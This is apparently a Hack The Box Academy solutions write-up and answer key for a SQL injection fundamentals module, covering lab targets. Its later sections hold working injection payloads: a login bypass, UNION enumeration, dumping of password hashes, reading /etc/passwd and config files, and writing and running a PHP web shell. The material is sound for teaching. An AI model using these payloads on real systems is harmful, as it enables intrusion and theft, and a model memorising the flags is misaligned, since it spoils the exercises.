| Section | Question Number | Answer |
| --- | --- | --- |
| Intro to MySQL | Question 1 | employees |
| SQL Statements | Question 1 | d005 |
| Query Results | Question 1 | Mitchem |
| SQL Operators | Question 1 | 654 |
| Subverting Query Logic | Question 1 | 202a1d1a8b195d5e9a57e434cc16000c |
| Using Comments | Question 1 | cdad9ecdf6f14b45ff5c4de32909caec |
| Union Clause | Question 1 | 663 |
| Union Injection | Question 1 | root@localhost |
| Database Enumeration | Question 1 | 9da2c9bcdf39d8610954e0e11ea8f45f |
| Reading Files | Question 1 | dB\_pAssw0rd\_iS\_flag! |
| Writing Files | Question 1 | d2b5b27ae688b6a0f1d21b7d3a0798cd |
| Skills Assessment - SQL Injection Fundamentals | Question 1 | 528d6d9cedc2c7aab146ef226e918396 |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Intro to MySQL

## Question 1

### "Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?"

Students first need to connect to the MySQL server on the spawned target machine, using the credentials `root:password`:

Code: shell

```shell
mysql -h STMIP -P STMPO -u root -ppassword
```

```
┌─[eu-academy-2]─[10.10.15.14]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ mysql -h 46.101.61.42 -P 30658 -u root -ppassword

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal 
mariadb.org binary distribution
```

Then, students need to list all the databases present using the `SHOW databases` query, and then submit the first database's name as the answer:

Code: sql

```sql
SHOW databases;
```

```
MariaDB [(none)]> SHOW databases;

+--------------------+
| Database           |
+--------------------+
| employees          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.003 sec)
```

Answer: `employees`

# SQL Statements

## Question 1

### "What is the department number for the 'Development' department?"

Students first need to connect to the MySQL server on the spawned target machine, using the credentials `root:password`:

Code: shell

```shell
mysql -h STMIP -P STMPO -u root -ppassword
```

```
┌─[eu-academy-2]─[10.10.15.14]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ mysql -h 46.101.61.42 -P 30658 -u root -ppassword

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal 
mariadb.org binary distribution
```

Then, students need to use the `employees` database, list all the tables within it, and understand the schema of the `departments` table using the `DESCRIBE` statement on it:

Code: sql

```sql
USE employees;
SHOW TABLES;
DESCRIBE departments;
```

```
MariaDB [(none)]> USE employees;

Database changed

MariaDB [employees]> SHOW TABLES;

+----------------------+
| Tables_in_employees  |
+----------------------+
| current_dept_emp     |
| departments          |
| dept_emp             |
| dept_emp_latest_date |
| dept_manager         |
| employees            |
| salaries             |
| titles               |
+----------------------+
8 rows in set (0.003 sec)

MariaDB [employees]> DESCRIBE departments;

+-----------+-------------+------+-----+---------+-------+
| Field     | Type        | Null | Key | Default | Extra |
+-----------+-------------+------+-----+---------+-------+
| dept_no   | char(4)     | NO   | PRI | NULL    |       |
| dept_name | varchar(40) | NO   | UNI | NULL    |       |
+-----------+-------------+------+-----+---------+-------+
2 rows in set (0.003 sec)
```

At last, students need to use the `SELECT` statement to retrieve the department number of the department whose name is `Development`:

Code: sql

```sql
SELECT dept_no FROM departments WHERE dept_name="Development";
```

```
MariaDB [employees]> SELECT dept_no FROM departments WHERE dept_name="Development";

+---------+
| dept_no |
+---------+
| d005    |
+---------+
1 row in set (0.003 sec)
```

Alternatively, students can just retrieve all data from the `departments` table to find the answer:

Code: sql

```sql
SELECT * FROM departments;
```

```
MariaDB [employees]> SELECT * FROM departments;

+---------+--------------------+
| dept_no | dept_name          |
+---------+--------------------+
| d009    | Customer Service   |
| d005    | Development        |
| 			<SNIP>             |
+---------+--------------------+
```

Answer: `d005`

# Query Results

## Question 1

### "What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01?"

Students first need to connect to the MySQL server on the spawned target machine, using the credentials `root:password`:

Code: shell

```shell
mysql -h STMIP -P STMPO -u root -ppassword
```

```
┌─[eu-academy-2]─[10.10.15.14]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ mysql -h 46.101.61.42 -P 30658 -u root -ppassword

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal 
mariadb.org binary distribution
```

Then, students need to use the `employees` database and understand the schema of the `employees` table using the `DESCRIBE` statement on it:

Code: sql

```sql
USE employees; 
DESCRIBE employees;
```

```
MariaDB [(none)]> use employees;

Database changed

MariaDB [employees]> DESCRIBE employees;

+------------+---------------+------+-----+---------+-------+
| Field      | Type          | Null | Key | Default | Extra |
+------------+---------------+------+-----+---------+-------+
|            |               |<SNIP>|     |         |       |
| last_name  | varchar(16)   | NO   |     | NULL    |       |
| hire_date  | date          | NO   |     | NULL    |       |
+------------+---------------+------+-----+---------+-------+
6 rows in set (0.003 sec)
```

At last, students need to use the `SELECT` statement to retrieve the last name of the employee whose first name starts with `Bar` and was hired on `1990-01-01`:

Code: sql

```sql
SELECT last_name FROM employees WHERE first_name LIKE 'Bar%' AND hire_date='1990-01-01';
```

```
MariaDB [employees]> SELECT last_name FROM employees WHERE first_name LIKE 'Bar%' AND hire_date='1990-01-01';

+-----------+
| last_name |
+-----------+
| Mitchem   |
+-----------+
1 row in set (0.001 sec)
```

Answer: `Mitchem`

# SQL Operators

## Question 1

### "In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?"

Students first need to connect to the MySQL server on the spawned target machine, using the credentials `root:password`:

Code: shell

```shell
mysql -h STMIP -P STMPO -u root -ppassword
```

```
┌─[eu-academy-2]─[10.10.15.14]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ mysql -h 46.101.61.42 -P 30658 -u root -ppassword

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal 
mariadb.org binary distribution
```

Then, students need to use the `employees` database and understand the schema of the `titles` table using the `DESCRIBE` statement on it:

Code: sql

```sql
USE employees;
DESCRIBE titles;
```

```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
MariaDB [(none)]> USE employees;

Database changed

MariaDB [employees]> DESCRIBE titles;

+-----------+-------------+------+-----+---------+-------+
| Field     | Type        | Null | Key | Default | Extra |
+-----------+-------------+------+-----+---------+-------+
| emp_no    | int(11)     | NO   | PRI | NULL    |       |
| title     | varchar(50) | NO   | PRI | NULL    |       |
| from_date | date        | NO   | PRI | NULL    |       |
| to_date   | date        | YES  |     | NULL    |       |
+-----------+-------------+------+-----+---------+-------+
4 rows in set (0.003 sec)
```

At last, students need to use the `SELECT` statement with the `COUNT()` function to retrieve the number of all records where the employee number is greater than 10000 or the employee title does not contain the string `engineer`:

Code: sql

```sql
SELECT COUNT(*) FROM titles WHERE emp_no > 10000 OR title NOT LIKE '%engineer%';
```

```
MariaDB [employees]> SELECT COUNT(*) FROM titles WHERE emp_no > 10000 OR title NOT LIKE '%engineer%';

+----------+
| COUNT(*) |
+----------+
|      654 |
+----------+
1 row in set (0.003 sec)
```

Alternatively, students can find out the number of records by retrieving all data without utilizing the `COUNT()` function:

Code: sql

```sql
SELECT * FROM titles WHERE emp_no > 10000 OR title NOT LIKE '%engineer%';
```

```
MariaDB [employees]> SELECT * FROM titles WHERE emp_no > 10000 OR title NOT LIKE '%engineer%';

+--------+--------------------+------------+------------+
| emp_no | title              | from_date  | to_date    |
+--------+--------------------+------------+------------+
|  10001 | Senior Engineer    | 1986-06-26 | 9999-01-01 |
|  10002 | Senior Engineer    | 1995-12-03 | 9999-01-01 |
|                           <SNIP>                      |
|  10648 | Engineer           | 1987-11-04 | 1993-11-03 |
|  10649 | Senior Engineer    | 1993-11-03 | 9999-01-01 |
|  10650 | Engineer           | 1996-12-25 | 9999-01-01 |
|  10651 | Assistant Engineer | 1988-12-29 | 1997-12-29 |
|  10652 | Engineer           | 1997-12-29 | 2000-11-15 |
|  10653 | Senior Staff       | 2000-03-12 | 9999-01-01 |
|  10654 | Staff              | 1992-03-12 | 2000-03-12 |
+--------+--------------------+------------+------------+
654 rows in set (0.002 sec)
```

Answer: `654`

# Subverting Query Logic

## Question 1

### "Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?"

Many approaches can be taken to solve this question.

A first approach is whereby students use the semicolon to end the query and then comment out the rest of it:

Code: sql

```sql
tom'; -- -
```

![[HTB Solutions/CPTS/z. images/e10a236e6b531f180836218e4ce7cd9d_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/da2d753ccf50ef6317b9bc422a34a13a_MD5.jpg]]

A second approach is whereby students use the `OR` operator to subvert the query's logic and then comment out the rest of it:

Code: sql

```sql
tom' OR '1' = '1' -- -
```

![[HTB Solutions/CPTS/z. images/fb253166278de9adb71521ae57a7810d_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/58e854ce94e7c038c5ba4fea4df5d75d_MD5.jpg]]

Answer: `202a1d1a8b195d5e9a57e434cc16000c`

# Using Comments

## Question 1

### "Login as the user with the id 5 to get the flag."

After knowing the structure of the query by trial and error, students need to bypass it using the following query:

Code: sql

```sql
' OR ID=5)-- -
```

![[HTB Solutions/CPTS/z. images/a34108c5d102531c862f69ea5827df7e_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/f62eb79d655010d7def5e911466a76ac_MD5.jpg]]

Answer: `cdad9ecdf6f14b45ff5c4de32909caec`

# Union Clause

## Question 1

### "Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table."

Students first need to connect to the MySQL server on the spawned target machine, using the credentials `root:password`:

Code: shell

```shell
mysql -h STMIP -P STMPO -u root -ppassword
```

```
┌─[eu-academy-2]─[10.10.15.14]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ mysql -h 46.101.61.42 -P 30658 -u root -ppassword

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal 
mariadb.org binary distribution
```

Then, students need to use the `employees` database and understand the schema of the `employees` and `departments` tables by using the `DESCRIBE` statement on them:

Code: sql

```sql
USE employees;
DESCRIBE employees;
DESCRIBE departments;
```

```
MariaDB [(none)]> use employees;

Database changed

MariaDB [employees]> DESCRIBE employees;

+------------+---------------+------+-----+---------+-------+
| Field      | Type          | Null | Key | Default | Extra |
+------------+---------------+------+-----+---------+-------+
| emp_no     | int(11)       | NO   | PRI | NULL    |       |
| birth_date | date          | NO   |     | NULL    |       |
| first_name | varchar(14)   | NO   |     | NULL    |       |
| last_name  | varchar(16)   | NO   |     | NULL    |       |
| gender     | enum('M','F') | NO   |     | NULL    |       |
| hire_date  | date          | NO   |     | NULL    |       |
+------------+---------------+------+-----+---------+-------+
6 rows in set (0.003 sec)

MariaDB [employees]> DESCRIBE departments;

+-----------+-------------+------+-----+---------+-------+
| Field     | Type        | Null | Key | Default | Extra |
+-----------+-------------+------+-----+---------+-------+
| dept_no   | char(4)     | NO   | PRI | NULL    |       |
| dept_name | varchar(40) | NO   | UNI | NULL    |       |
+-----------+-------------+------+-----+---------+-------+
2 rows in set (0.003 sec)
```

Since the `departments` table has lesser number of columns compared to `employees`, students need to inject 4 more "dummy columns" when executing the `UNION` query:

Code: sql

```sql
SELECT COUNT(*) FROM (SELECT * FROM employees UNION SELECT dept_no,dept_name,3,4,5,6 FROM departments) Foo;
```

```
MariaDB [employees]> SELECT COUNT(*) FROM (SELECT * FROM employees UNION SELECT dept_no,dept_name,3,4,5,6 FROM departments) Foo;

+----------+
| COUNT(*) |
+----------+
|      663 |
+----------+
1 row in set (0.005 sec)
```

Alternatively, students can find out the number of records by just retrieving all data without the `COUNT()` function:

Code: sql

```sql
SELECT * FROM employees UNION SELECT dept_no,dept_name,3,4,5,6 FROM departments;
```

```
+--------+--------------------+--------------+
| emp_no | birth_date         | first_name   |
+--------+--------------------+--------------+
| 10001  | 1953-09-02         | Georgi       |
| 10002  | 1952-12-03         | Vivian       |
|                     <SNIP>                 |
+--------+--------------------+--------------+
663 rows in set (0.006 sec)
```

Answer: `663`

# Union Injection

## Question 1

### "Use a Union injection to get the result of 'user()'"

Students first need to detect the number of columns being selected in the query ran by the backend of the web-application. Either `ORDER BY` or `UNION` injections can be used. Using the `UNION` statement injection, students will need to execute queries until no error message is received, i.e., until the number of columns match:

Code: sql

```sql
' UNION SELECT 1-- -
```

![[HTB Solutions/CPTS/z. images/cceaaca3aede2ddf5db0dec8cfcc82c3_MD5.jpg]]

Code: sql

```sql
' UNION SELECT 1,2-- -
```

![[HTB Solutions/CPTS/z. images/1c30a0c8650280458a5d87d65ed194dc_MD5.jpg]]

Code: sql

```sql
' UNION SELECT 1,2,3-- -
```

![[HTB Solutions/CPTS/z. images/9b188716f072c11fc57ca71b9b922f8f_MD5.jpg]]

Code: sql

```sql
' UNION SELECT 1,2,3,4-- -
```

![[HTB Solutions/CPTS/z. images/76713cf3a657ba6018e17c6030d04403_MD5.jpg]]

Since there are four columns, students need to inject the `user()` function in either the 2nd, 3rd, or 4th column:

Code: sql

```sql
' UNION SELECT 1,user(),3,4-- -
```

![[HTB Solutions/CPTS/z. images/88b52f4f4700aaff337f5358fbd9e996_MD5.jpg]]

Answer: `root@localhost`

# Database Enumeration

## Question 1

### "What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?"

Since students are given the names of the database and the table, they only need to enumerate the names of columns within the `users` table:

Code: sql

```sql
foo' UNION SELECT 1,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'-- -
```

![[HTB Solutions/CPTS/z. images/75ccea008f77b8b98958b415ef695509_MD5.jpg]]

At last, students need to use the `UNION` injection statement to fetch the `username` and `password` columns from the `users` table within the `ilfreight` database:

Code: sql

```sql
foo' UNION SELECT 1,username,password,4 FROM ilfreight.users-- -
```

![[HTB Solutions/CPTS/z. images/f0e300ea9d2943babca23c0c047a878c_MD5.jpg]]

Answer: `9da2c9bcdf39d8610954e0e11ea8f45f`

# Reading Files

## Question 1

### "We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password."

Students first need to know the current user that is executing the SQL queries in the backend server:

Code: sql

```sql
foo' UNION SELECT 1,user(),3,4-- -
```

![[HTB Solutions/CPTS/z. images/5ed1e259cf847d1b6f46044bb6882b6e_MD5.jpg]]

The user is `root`, which is an account that possess many privileges.

Students then will need to test if the current user has super admin privileges:

Code: sql

```sql
foo' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

![[HTB Solutions/CPTS/z. images/260296a94303871a3436eb56a09427ea_MD5.jpg]]

`Y` denotes `YES`, thus, the current user has super admin privileges. Students then will need to enumerate other privileges that the current user has to check whether they can read files or not:

Code: sql

```sql
foo' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

![[HTB Solutions/CPTS/z. images/b98bf72ae44b83660a5d71e3a9bec40b_MD5.jpg]]

The `FILE` privilege is listed for the current user, thus, the current user can read files.

Since students can read files, they first need to load the "search.php" file and view its source code:

Code: sql

```sql
foo' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

Students will notice that the "config.php" file is imported using the `include` command:

![[HTB Solutions/CPTS/z. images/879d0ad450ebf2b9e9dc90b362004970_MD5.jpg]]

Thus, at last, students need to load that file and find the flag as the value for `DB_PASSWORD`:

Code: sql

```sql
foo' UNION SELECT 1,LOAD_FILE("/var/www/html/config.php"),3,4-- -
```

![[HTB Solutions/CPTS/z. images/b9cf3539e4a71bc5ef95206cbacbd83f_MD5.jpg]]

Answer: `dB_pAssw0rd_iS_flag!`

# Writing Files

## Question 1

### "Find the flag by using a webshell."

Students first need to check whether the current user they are executing queries as can read and write files to any directory on the backend server:

```sql
foo' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

![[HTB Solutions/CPTS/z. images/8862b2e792f838207ad50bb510fde1bb_MD5.jpg]]

Since the value for `SECURE_FILE_PRIV` is empty, the current user can read and write files to any directory. Thus, students then need to write a web shell to the web root folder to allow them to execute commands on the backend server:

```sql
foo' UNION SELECT "",'<?php system($_REQUEST["cmd"]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
```

Once the web shell has been successfully written into the web root folder, students at last need to browse to the "shell.php" file and specify the command to be executed in the "cmd" parameter (which must be URL-encoded):

```shell
http://STMIP:STMPO/shell.php?cmd=cat%20../flag.txt
```

![[HTB Solutions/CPTS/z. images/e68ba3a40730a24863408badd3ae17e3_MD5.jpg]]

Answer: `d2b5b27ae688b6a0f1d21b7d3a0798cd`

# Skills Assessment - SQL Injection Fundamentals

## Question 1

### "Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer."

After spawning the target machine, students need to navigate to its website's root page to find a login form:

![[HTB Solutions/CPTS/z. images/baeb5b190d5fd8405148a18af3292355_MD5.jpg]]

Since students do not have any credentials to login with, they need to subvert the query's logic with an OR injection to land inside the "Employee Dashboard" :

```sql
admin' OR '1' = '1' -- -
```

![[HTB Solutions/CPTS/z. images/f7b386e6332cc083a9a38bcdccb4f660_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/2bf6bb3632d4da6bded4dde1024730a7_MD5.jpg]]

Subsequently, students need to test whether the "SEARCH" field is vulnerable to SQL injections by providing a single apostrophe `'`, which in turns returns a SQL error message: " You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1":

![[HTB Solutions/CPTS/z. images/6a6af2a49bb4342c1b22d3b00a1bacd6_MD5.jpg]]

Now that students are assured it is vulnerable, they need to utilize `UNION` injections to attempt reading files from the backend server. Students need to detect the number of columns selected by the backend server using either the `ORDER BY` method or the `UNION` method, the latter will be utilized. Students need to test `UNION` injection queries with a different number of columns until attaining a successful results back, i.e., not getting the error message "The used SELECT statements have a different number of columns". After trail and error, students will find that there are five columns in total, with the first column not being displayed:

```sql
' UNION SELECT 1,2,3,4,5 -- -
```

![[HTB Solutions/CPTS/z. images/c2ef42fb6af533472fa4e35126197a14_MD5.jpg]]

Subsequently, students now need to determine the SQL user that is running the queries in the backend server:

```sql
' UNION SELECT 1,user(),3,4,5 -- -
```

![[HTB Solutions/CPTS/z. images/391e185cc5cc6ef8f14bb822092b5018_MD5.jpg]]

Given that the user is `root`, it is very promising as this user is likely to be a DBA which posses many privileges. Thereafter, students need to enumerate all the privileges that the `root` user has, and whether they are granted to it or not:

```sql
' UNION SELECT 1, grantee, privilege_type, is_grantable, 5 FROM information_schema.user_privileges -- -
```

![[HTB Solutions/CPTS/z. images/445a960450b78a42be5eafacd68ec420_MD5.jpg]]

With the `FILE` privilege granted to `root`, students can attempt to read the `/etc/passwd` file from the backend server using the `LOAD_FILE` function, injecting it in any column other than the first (the second column will be utilized):

```sql
' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4, 5-- -
```

![[HTB Solutions/CPTS/z. images/0bf55610b68db9477899f2ea40d4b705_MD5.jpg]]

Subsequently, students need to make sure that the MySQL global variable `secure_file_priv` is not enabled:

```sql
' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables WHERE variable_name="secure_file_priv" -- -
```

![[HTB Solutions/CPTS/z. images/300560907e3de0a19ba82d0210e16324_MD5.jpg]]

Since the value for the variable `SECURE_FILE_PRIV` is empty, the user `root` can read and write files to any directory in the entire file system. Therefore, students now need to write a PHP web shell `shell.php` using `INTO OUTFILE` to the directory `/var/www/html/dashboard/` (using the directory `/var/www/html/` instead will result in `Errcode: 13 "Permission Denied"`):

```sql
' UNION SELECT "",'<?php system($_REQUEST["cmd"]); ?>', "", "", "" INTO OUTFILE '/var/www/html/dashboard/shell.php'-- -
```

![[HTB Solutions/CPTS/z. images/c859393aef0d362d7139f9729bd926c8_MD5.jpg]]

With no error messages received, the web shell should be written to the backend server successfully. Therefore, students need to utilize `cURL` to invoke the web shell, passing commands to the URL parameter `cmd` (or any other parameter name chosen). First, students need to list all the files that are in the root directory `/` (deleting the first two lines, as they are unwanted), making sure to use `+` for the space character:

```shell
curl -w "\n" -s http://STMIP:STMPO/dashboard/shell.php?cmd=ls+/ | sed -e '1,2d'
```
```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-ubuyae6zow]─[~]
└──╼ [★]$ curl -w "\n" -s http://159.65.63.151:31872/dashboard/shell.php?cmd=ls+/ | sed -e '1,2d'
	bin
boot
dev
etc
flag_cae1dadcd174.txt
home
lib
<SNIP>
```

From the output, students will know that the file is named `flag_cae1dadcd174.txt` and is under the root directory, thus, they need to print its contents out with `cat`, making sure to use `+` for the space character:

```shell
curl -w "\n" -s http://STMIP:STMPO/dashboard/shell.php?cmd=cat+/flag_cae1dadcd174.txt | sed -e '1,2d'
```
```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-ubuyae6zow]─[~]
└──╼ [★]$ curl -w "\n" -s http://159.65.63.151:31872/dashboard/shell.php?cmd=cat+/flag_cae1dadcd174.txt | sed -e '1,2d'

	528d6d9cedc2c7aab146ef226e918396
```

Answer: `528d6d9cedc2c7aab146ef226e918396`